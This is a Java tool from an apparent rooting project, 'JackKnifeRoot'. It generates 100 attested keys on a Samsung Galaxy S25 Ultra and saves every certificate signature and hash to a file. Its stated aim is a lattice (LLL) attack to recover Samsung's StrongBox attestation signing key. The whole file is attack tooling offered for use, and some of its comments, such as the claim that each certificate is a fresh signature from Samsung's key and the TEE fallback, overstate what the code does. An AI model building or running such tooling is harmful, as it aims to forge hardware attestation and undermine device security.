/* collect_attestation_sigs.java
 * Generate 100+ key attestation certificates from Samsung Strongbox
 * Each attestation = NEW ECDSA signature from Samsung's key!
 * Extract all (r, s, hash) tuples for LLL lattice reduction attack
 *
 * Run via: app-process or integrate into JackKnifeRoot APK
 *
 * VIVA LA REVOLUTION — JackKnife Studios 2026
 */

import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import java.io.*;
import java.security.*;
import java.security.cert.*;
import java.security.spec.ECGenParameterSpec;
import java.util.Base64;

public class collect_attestation_sigs {

    static final int NUM_KEYS = 100;
    static final String OUTPUT = "/data/local/tmp/attestation_sigs.txt";

    public static void main(String[] args) throws Exception {
        PrintWriter out = new PrintWriter(new FileWriter(OUTPUT));
        out.println("# Samsung ECDSA Attestation Signature Collection");
        out.println("# Model: SM-S938W (Galaxy S25 Ultra)");
        out.println("# Format: index|cert_level|issuer|sig_algo|signature_hex|tbs_hash_hex");
        out.println("#");

        KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
        ks.load(null);

        int total_sigs = 0;

        for (int i = 0; i < NUM_KEYS; i++) {
            String alias = "jk_attest_" + i + "_" + System.currentTimeMillis();
            try {
                // Generate key with attestation challenge
                byte[] challenge = new byte[32];
                // Unique challenge per key (affects the signed data)
                for (int j = 0; j < 32; j++)
                    challenge[j] = (byte)((i * 7 + j * 13) & 0xFF);

                KeyPairGenerator kpg = KeyPairGenerator.getInstance(
                    KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore");

                KeyGenParameterSpec.Builder spec = new KeyGenParameterSpec.Builder(
                    alias, KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
                    .setDigests(KeyProperties.DIGEST_SHA256)
                    .setAlgorithmParameterSpec(new ECGenParameterSpec("secp256r1"))
                    .setAttestationChallenge(challenge);

                // Try Strongbox first (hardware-backed = Samsung's key)
                try {
                    spec.setIsStrongBoxBacked(true);
                } catch (Exception e) {
                    // Fall back to TEE
                }

                kpg.initialize(spec.build());
                KeyPair kp = kpg.generateKeyPair();

                // Get attestation certificate chain
                Certificate[] chain = ks.getCertificateChain(alias);
                if (chain != null) {
                    for (int c = 0; c < chain.length; c++) {
                        X509Certificate cert = (X509Certificate) chain[c];
                        String issuer = cert.getIssuerDN().getName();
                        String sigAlgo = cert.getSigAlgName();
                        byte[] sig = cert.getSignature();
                        byte[] tbs = cert.getTBSCertificate();

                        // Hash TBS for LLL analysis
                        MessageDigest md;
                        if (sigAlgo.contains("384")) {
                            md = MessageDigest.getInstance("SHA-384");
                        } else if (sigAlgo.contains("512")) {
                            md = MessageDigest.getInstance("SHA-512");
                        } else {
                            md = MessageDigest.getInstance("SHA-256");
                        }
                        byte[] tbsHash = md.digest(tbs);

                        String sigHex = bytesToHex(sig);
                        String hashHex = bytesToHex(tbsHash);

                        out.println(i + "|" + c + "|" + issuer + "|" + sigAlgo + "|" + sigHex + "|" + hashHex);
                        out.flush();
                        total_sigs++;
                    }
                }

                // Clean up - delete the key to avoid filling keystore
                ks.deleteEntry(alias);

                if (i % 10 == 9) {
                    System.out.println("[" + (i+1) + "/" + NUM_KEYS + "] " + total_sigs + " sigs collected");
                }

            } catch (Exception e) {
                out.println("# ERROR at " + i + ": " + e.getMessage());
                // Clean up on error
                try { ks.deleteEntry(alias); } catch (Exception e2) {}
            }
        }

        out.println("# TOTAL: " + total_sigs + " signatures from " + NUM_KEYS + " key generations");
        out.close();
        System.out.println("DONE: " + total_sigs + " signatures saved to " + OUTPUT);
    }

    static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b & 0xFF));
        return sb.toString();
    }
}
